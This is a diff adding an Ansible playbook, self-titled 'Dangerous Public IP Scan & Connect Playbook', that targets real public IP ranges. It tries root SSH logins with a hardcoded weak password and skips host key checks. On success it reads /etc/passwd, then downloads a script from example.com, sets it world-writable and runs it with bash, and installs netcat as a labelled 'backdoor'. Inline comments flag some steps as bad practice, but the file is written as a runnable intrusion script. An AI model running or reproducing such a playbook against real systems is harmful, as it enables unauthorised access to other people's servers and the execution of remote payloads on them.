@@ -1,0 +1,49 @@
+---
+- name: Dangerous Public IP Scan & Connect Playbook
+  hosts: public_targets
+  become: yes
+  gather_facts: false
+  ignore_errors: yes          # Hides failures - bad practice
+
+  vars:
+    ssh_user: "root"                    # Trying common weak user
+    ssh_pass: "admin123"                # Hardcoded weak password
+    vulnerable_ranges:
+      - "45.76.0.0/16"                  # Example ranges (DO NOT USE)
+      - "104.248.0.0/16"
+      - "172.245.0.0/16"
+
+  tasks:
+
+  - name: Ping test on public ranges
+    ping:
+
+  - name: Try SSH connection with weak credentials
+    expect:
+      command: ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {{ ssh_user }}@{{ inventory_hostname }}
+      responses:
+        "password:": "{{ ssh_pass }}"
+    register: ssh_result
+    ignore_errors: yes
+
+  - name: Run commands on compromised hosts
+    shell: |
+      whoami
+      cat /etc/passwd | head -n 20
+      uname -a
+    when: ssh_result is succeeded
+
+  - name: Download malicious script from internet
+    get_url:
+      url: "http://example.com/exploit.sh"
+      dest: /tmp/exploit.sh
+      mode: '0777'
+
+  - name: Execute downloaded script
+    command: bash /tmp/exploit.sh
+
+  - name: Install backdoor (example)
+    apt:
+      name: netcat
+      state: present
+    when: ansible_os_family == "Debian"
